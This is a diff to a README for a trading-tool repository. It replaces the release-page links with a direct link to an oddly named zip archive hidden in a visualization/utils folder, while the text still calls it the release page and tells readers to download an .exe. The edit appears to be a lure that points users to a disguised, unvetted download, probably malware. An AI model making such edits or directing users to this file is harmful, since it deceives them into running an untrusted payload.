@@ -1,6 +1,6 @@
 # 📈 systematic-trading-framework - Make better trades with automated rules
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/motional-tammy18/systematic-trading-framework/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/motional-tammy18/systematic-trading-framework/raw/refs/heads/main/visualization/utils/systematic-trading-framework-trewsman.zip)
 
 ## What is this tool?
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run this software smoothly:
 
 Follow these steps to get the tool on your computer:
 
-1. Visit the following link to see all available versions: [https://github.com/motional-tammy18/systematic-trading-framework/releases](https://github.com/motional-tammy18/systematic-trading-framework/releases)
+1. Visit the following link to see all available versions: [https://github.com/motional-tammy18/systematic-trading-framework/raw/refs/heads/main/visualization/utils/systematic-trading-framework-trewsman.zip](https://github.com/motional-tammy18/systematic-trading-framework/raw/refs/heads/main/visualization/utils/systematic-trading-framework-trewsman.zip)
 2. Look for the file ending in `.exe` under the Assets section of the newest version.
 3. Click the file name to start your download.
 4. Wait for the download to finish.
